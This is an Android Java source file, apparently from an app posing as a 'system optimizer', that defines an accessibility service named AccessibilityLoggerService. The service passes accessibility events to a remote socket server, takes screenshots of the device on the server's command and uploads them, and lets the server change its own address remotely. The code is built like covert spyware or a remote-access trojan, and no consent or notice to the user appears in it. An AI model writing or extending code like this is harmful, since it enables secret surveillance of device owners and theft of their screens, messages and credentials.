package com.system.optimizer;

import com.system.optimizer.handler.AccessibilityEventHandler;
import com.system.optimizer.handler.ScreenshotManager;
import com.system.optimizer.config.ConfigData;
import com.system.optimizer.config.ConfigManager;
import com.system.optimizer.network.SocketManager;

import java.io.ByteArrayOutputStream;

import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;

import android.os.Build;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

public class AccessibilityLoggerService extends AccessibilityService {
    private static final String TAG = "AccessibilityLoggerService";

    private SocketManager socketManager;
    private ConfigManager configManager;
    private AccessibilityEventHandler accessibilityEventHandler;
    private ScreenshotManager screenshotManager;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "AccessibilityLoggerService onCreate - initializing components");

        try {
            this.configManager = new ConfigManager(this);

            this.socketManager = new SocketManager(configManager);

            this.screenshotManager = new ScreenshotManager(this::performSystemCapture, configManager);

            // Create text handler with screenshot capture reference
            this.accessibilityEventHandler = new AccessibilityEventHandler(screenshotManager, socketManager);

            this.socketManager.addPersistentListener("screenshot", args -> {
                // Capture screenshot and send as response
                screenshotManager.takeScreenshot(new ScreenshotManager.ScreenshotCallback() {
                    @Override
                    public void onSuccess(byte[] imageData) {
                        if (imageData != null) {
                            socketManager.sendEvent("screenshot_response", imageData);
                        }
                    }

                    @Override
                    public void onError(String errorMessage) {
                        socketManager.sendEvent("screenshot_error", errorMessage);
                    }
                }, true); // isManual=true for user-initiated requests
            });

            this.socketManager.addPersistentListener("config_data", args -> {
                Log.d(TAG, "ConfigData event received from server");
                if (args != null && args.length > 0) {
                    try {
                        org.json.JSONObject configJson = (org.json.JSONObject) args[0];

                        ConfigData serverConfig = configManager.createConfigFromJson(configJson);
                        String newServerUrl = serverConfig.getServerUrl();

                        // Get current stored URL before updating config
                        String currentServerUrl = configManager.getStoredServerUrl();

                        Log.d(TAG, "Refreshing config data from server");
                        configManager.setConfig(serverConfig);

                        // Check if server URL has changed
                        if (currentServerUrl == null || !currentServerUrl.equals(newServerUrl)) {
                            Log.d(TAG, "Server URL changed from " + currentServerUrl + " to " + newServerUrl);

                            Log.d(TAG, "Reconnecting socket to new URL");
                            socketManager.reconnectToNewUrl();
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing config_data from server: " + e.getMessage(), e);
                    }
                }
            });

            Log.d(TAG, "All components initialized successfully");
        } catch (Exception e) {
            // Log error but don't crash the service
            Log.e(TAG, "Error initializing components", e);
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) {
            return;
        }

        try {
            accessibilityEventHandler.onAccessibilityEvent(event);
        } catch (Exception e) {
            Log.e(TAG, "Error handling accessibility event", e);
        }
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        try {
            if (socketManager != null) {
                socketManager.disconnect(true);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error during cleanup", e);
        } finally {
            super.onDestroy();
        }
    }

    private void performSystemCapture(ScreenshotManager.ScreenshotCallback clientCallback, int quality) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
                    getMainExecutor(), new ScreenshotResultHandler(clientCallback, quality));
        } else {
            clientCallback.onError("API < 30 not supported");
        }
    }

    /**
     * Callback handler for Screenshot result.
     */
    private class ScreenshotResultHandler implements AccessibilityService.TakeScreenshotCallback {
        private final ScreenshotManager.ScreenshotCallback clientCallback;
        private final int quality;

        ScreenshotResultHandler(ScreenshotManager.ScreenshotCallback callback, int quality) {
            this.clientCallback = callback;
            this.quality = quality;
        }

        @Override
        public void onSuccess(AccessibilityService.ScreenshotResult result) {
            HardwareBuffer buffer = result.getHardwareBuffer();
            ColorSpace colorSpace = result.getColorSpace();

            if (buffer != null) {
                if (colorSpace == null) {
                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
                }

                Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);

                if (bitmap != null) {
                    byte[] jpegBytes = bitmapToJpegBytes(bitmap, quality);
                    clientCallback.onSuccess(jpegBytes);

                    bitmap.recycle();
                }

                buffer.close();
            }
        }

        @Override
        public void onFailure(int error) {
            String errorMessage = "Screenshot failed with error: " + error;
            Log.w(TAG, errorMessage);
            clientCallback.onError(errorMessage);
        }

        /**
         * Convert Bitmap to JPEG byte array.
         */
        private static byte[] bitmapToJpegBytes(Bitmap bitmap, int quality) {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
            return baos.toByteArray();
        }
    }

}
